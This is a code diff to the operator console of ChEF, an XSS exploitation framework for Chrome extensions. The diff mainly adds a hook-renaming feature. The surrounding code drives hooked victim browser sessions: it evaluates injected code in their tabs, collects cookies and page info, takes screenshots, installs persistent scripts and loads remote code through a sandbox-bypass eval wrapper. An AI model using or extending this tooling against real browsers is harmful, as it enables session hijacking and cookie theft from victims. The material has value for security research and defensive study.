@@ -78,6 +78,7 @@ right: 20px;
 display:none;
 }
 </style>
+</head>
 <body>
 <div class="navbar navbar-fixed-top">
     <div class="navbar-inner">
@@ -96,7 +97,7 @@ display:none;
         <div class="span12">
             <div class="tabbable">
                 <ul class="nav nav-tabs">
-                    <li><button title="Choose hooked session" id=choose-hook class='btn btn-secondary'><i class="icon-list"></i></button>&nbsp;&nbsp;</li>
+                    <li><button title="Choose hooked session" id=choose-hook class='btn btn-secondary'><i class="icon-list"></i></button>&nbsp;<button id=current-hook class='btn btn-secondary'><i class="icon-tag"></i><span id=current-hook-name></span></button>&nbsp;&nbsp;</li>
                     <li class="active"><a href="#tab-tabs" class='active' data-toggle="tab">Tabs</a></li>
                     <li><a href="#tab-persistent-scripts" data-toggle="tab">Persistent scripts</a></li>
                     <li><a href="#tab-ext-info" data-toggle="tab">Hooked extension info</a></li>
@@ -235,7 +236,7 @@ display:none;
                                                 <h5>Links (click to navigate in tab) <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></h5>
                                                 <ul id=links></ul>
                                             </div>
-                                            <div class="tab-pane" id="tab-info">
+                                            <div class="tab-pane active" id="tab-info">
                                                 <p>
                                                 <button id=report-page-info class="btn btn-secondary">Get cookies etc.</button>
                                                 </p>
@@ -342,7 +343,7 @@ display:none;
   <div class="modal-body">
   <p>Each hook below represents single browser session that XSS has been activated in. Chose one you'd like to
   exploit:</p>
-  <select size=10 class="input-xlarge" name="choose-hook">
+  <select size=10 class="row-fluid" name="choose-hook">
   </select>
   </div>
   <div class=modal-footer>
@@ -351,6 +352,20 @@ display:none;
 </div>
 </div>
 
+<div class="modal" id="current-hook-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>Hooked session details</h3>
+  </div>
+  <div class="modal-body">
+    <p>Below are details about your currently selected hook.</p>
+    <p name="current-hook"></p>
+    <input size=10 class="row-fluid" name="current-hook-name">
+  </div>
+  <div class=modal-footer>
+    <a href="#" id=save-hook-name class="btn btn-primary">Save hook name</a>
+  </div>
+</div>
 <div class="modal" id="about-modal">
   <div class="modal-header">
     <a class="close" data-dismiss="modal">&times;</a>
@@ -364,7 +379,7 @@ display:none;
       Whenever you encounter a XSS vulnerability in Chrome extension, ChEF will ease the exploitation.
       </p>
   </div>
-  </div>
+</div>
 <div class="modal" id="hook-modal">
   <div class="modal-header">
     <a class="close" data-dismiss="modal">&times;</a>
@@ -402,6 +417,15 @@ var ws;
 var hook = localStorage['lastHook'] || '';
 var currentTab = null;
 
+function updateHookName(hookName) {
+    if (hookName == undefined || hookStorage.retrieve(hook, 'name') == undefined){
+        $('#current-hook-name')[0].innerText = ' ' + hook
+    } else {
+        $('#current-hook-name')[0].innerText = ' ' + hookStorage.retrieve(hook, 'name') ||  hookName
+    }
+    return;
+}
+
 function prettyPrint(m) {
     if (typeof m == 'string') {
         return m === "" ? '""' : m;
@@ -410,10 +434,12 @@ function prettyPrint(m) {
 }
 
 if (document.location.pathname == '/') { // served through Node.js, use websockets
-    if (MozWebSocket) {
-        WebSocket = MozWebSocket;
-    }
-    ws = new WebSocket(document.location.href.replace(/^http/, 'ws'), 'chef');
+    try {
+        if (MozWebSocket) {
+            WebSocket = MozWebSocket;
+        }
+    } catch(e) {}
+    ws = new WebSocket((document.location.href.substring(0, document.location.href.indexOf('#'))||document.location.href).replace(/^http/, 'ws'), 'chef');
     if (!ws) {
         alert("Trouble connecting through WebSocket, use PHP/Apache version or other browser");
     } else {
@@ -422,13 +448,14 @@ if (document.location.pathname == '/') { // served through Node.js, use websocke
                 var json = JSON.parse(ev.data);
                 for (var i=0; i < json.length; i++) {
                     processResponse(json[i][0],hook);
-                }            
+                }
             } catch (e) {}
         }
         ws.onopen = function() {
             ws.send(JSON.stringify({cmd:'hello-c2c'}));
             if (hook) {
                 ws.send(JSON.stringify({cmd:"set-channel",ch:hook}));
+                updateHookName(JSON.parse(localStorage['hooks'])[hook]['name'] || hook) // Bleh, hookStorage is defined below... lame! Maybe functions should be moved into their own block?
             }
 
         }
@@ -638,6 +665,7 @@ function getPersistentLog() {
     }
     return tmp;
 }
+
 function processResponse(r, hook) {
     if (typeof r == 'string' || !r.type) {
         log(r);
@@ -698,7 +726,7 @@ function processResponse(r, hook) {
         break;
     }
 }
-   
+
 $(function() {
 
     if (ws) {
@@ -708,14 +736,14 @@ $(function() {
         var hook_url = document.location.href.replace('/console.html', '/hook.php');
         var echo_js_url = document.location.href.replace('/console.html', '/echo.php');
     }
-    
+
     $('.hook-url').each(function() {$(this).text($(this).text().replace(/__HOOK_URL__/g, hook_url)) });
-    
+
     $('#do-screenshot').click(function() {
         sendCmd('screenshot');
     });
-    
-    
+
+
     function evalWithSandboxBypass(code, tab_id) {
         var wrapper = "(function() {\n\
     var d=document;\n\
@@ -725,7 +753,7 @@ $(function() {
     })();";
         url = echo_js_url + '?c=' + encodeURIComponent(code) + '&t=' + Math.random();
         var wrapped_code = wrapper.replace('__CODE__', url);
-    
+
         sendCmd('eval', wrapped_code, {id: tab_id});
     }
 
@@ -797,18 +825,18 @@ d.body.appendChild(s);\n\
         sendCmd('reportpageinfo', null, {id: currentTab});
         sendCmd('reportcookies', null, {id: currentTab});
     });
-    
+
     $('#ping').click(function() {
         sendCmd('ping');
-    });    
-    
+    });
+
     $("#refresh-hook").click(function() {
         refreshTabsTable([]);
         refreshPersistentScriptList([]);
         fillDataTemplate($('#tab-ext-info'), {});
         sendCmd('report');
     });
-    
+
     $(document).on('click', '#links a', function() {
         var cmd = "location.href = " + JSON.stringify(this.href);
         sendCmd('eval', cmd, {id: currentTab});
@@ -820,13 +848,14 @@ d.body.appendChild(s);\n\
             sendCmd('createtab', this.value);
         }
     });
-    
+
     $('#hook-chosen').click(function() {
         var v;
         if (v = $('select[name="choose-hook"]').val()) {
             hook = localStorage['lastHook'] = v;
             $('#hook-id').text(v);
             al('Chosen hook: ' + v);
+            updateHookName(v)
             $('#choose-hook-modal').modal('hide');
             if (ws) {
                 ws.send(JSON.stringify({cmd:"set-channel",ch:hook}));
@@ -836,6 +865,17 @@ d.body.appendChild(s);\n\
         return false;
     });
     
+    $('#save-hook-name').click(function() {
+        var v;
+        if (v = ($('input[name="current-hook-name"]').val() || hook)) {
+            hookStorage.store(hook, 'name', v)
+            log('Chosen renamed: ' + hook + ' = ' + v);
+            updateHookName(v)
+            $('#current-hook-modal').modal('hide');
+        }
+        return false;
+    });
+
     $('#choose-hook').click(function() {
         var displayHookChoice = function(json) {
             if (!json.length) {
@@ -844,23 +884,47 @@ d.body.appendChild(s);\n\
             }
             var $s = $('select[name="choose-hook"]').html('');
             $s.append($('<option>').text('choose...'));
-            for (var i =0; i < json.length; i++) {
-                var text = json[i].ch + ' - ' + json[i].ip + ' ' + json[i].lastActive;
+            for (var i = 0; i < json.length; i++) {
+                var text = json[i].ch;
+                if(name = hookStorage.retrieve(hook, 'name')) text += ' (' + name + ')';
+                text += ' - ' + json[i].ip + ' ' + json[i].lastActive;
                 $('<option>').text(text).val(json[i].ch).appendTo($s);
             }
             $s.val(hook); // select current hook
             $('#choose-hook-modal').modal('show');
         };
-        
+
+    if (ws) {
+        $.getJSON('/list', displayHookChoice);
+    } else {
+        $.getJSON('server.php', displayHookChoice);
+    }
+
+    return false;
+    });
+
+    $('#current-hook').click(function() {
+        var changeHookName = function(json) {
+                if (!json.length) {
+                    al("Not connected to a Hook...");
+                    return;
+                }
+                var $s = $('select[name="current-hook"]').html('');
+                $('p[name=current-hook]')[0].innerText = "Real Name: " + hook;
+                $('#current-hook-modal').modal('show');
+                $('input[name="current-hook-name"]').val(hookStorage.retrieve(hook, 'name') || hook);
+            };
+
         if (ws) {
-            $.getJSON('/list', displayHookChoice);
+            $.getJSON('/list', changeHookName);
         } else {
-            $.getJSON('server.php', displayHookChoice);
+            $.getJSON('server.php', changeHookName);
         }
-        
+
         return false;
     });
-    
+
+
     $("#add-persistent-script").submit(function() {
         if (!hook) {
             al('No current hook!');
@@ -880,7 +944,7 @@ d.body.appendChild(s);\n\
             al("Invalid RegExp syntax in URL!");
             return false;
         }
-        
+
         sendCmd('addpersistent', params);
         $(this.elements).each(function() { $(this).val(''); });
         return false;
@@ -890,7 +954,7 @@ d.body.appendChild(s);\n\
         sendCmd('removepersistent', $(this).attr('data'));
         return false;
     });
-    
+
     $("#clear-persistent-scripts-log").click(function() {
         delete localStorage['persistentLog'];
         $("#persistent-script-log").html('');
@@ -899,23 +963,25 @@ d.body.appendChild(s);\n\
 
     $("#fix-server").click(function() {
         if (ws) {
-            ws.send(JSON.stringify({cmd:'delete'}));
+            ws.send(JSON.stringify({
+                cmd: 'delete'
+            }));
         }
         $.get('server.php?delete=1');
     });
-    
+
     if (!ws) {
         setInterval(function() {
             if (hook) {
                 $.getJSON('server.php?ch=' + encodeURIComponent(hook), function(json) {
-                    for (var i=0; i < json.length; i++) {
+                    for (var i = 0; i < json.length; i++) {
                         processResponse(json[i][0],hook);
                     }
                 });
             }
         }, 2000);
     }
-    
+
     var snippetsFile = ws ? 'snippets.xml' : 'snippets.xml.php';
 
     $.get(snippetsFile, function(xml) {
@@ -928,8 +994,9 @@ d.body.appendChild(s);\n\
                 .val(code)
                 .text(name)
             );
+
         });
-    }, 'xml'); 
+    }, 'xml');
 
     $("#eval-snippets").change(function() {
         var val = $(this).val();
@@ -946,7 +1013,7 @@ d.body.appendChild(s);\n\
             $(':input[name=name]', this.form).val(this.options[this.selectedIndex].innerHTML);
         }
     });
-    
+
     $("#eval-ext-snippets").change(function() {
         var val = $(this).val();
         if (val) {
@@ -959,7 +1026,7 @@ d.body.appendChild(s);\n\
     refreshPersistentScriptList(hookStorage.retrieve(hook, 'persistent', []));
     refreshPersistentScriptLog(getPersistentLog());
     fillDataTemplate($('#tab-ext-info'), hookStorage.retrieve(hook, 'info', {}));
-    al("Refreshed state from local storage");    
+    al("Refreshed state from local storage");
     $.get('README.md', function(t) { $('#readme').text(t) });
 });
 </script>
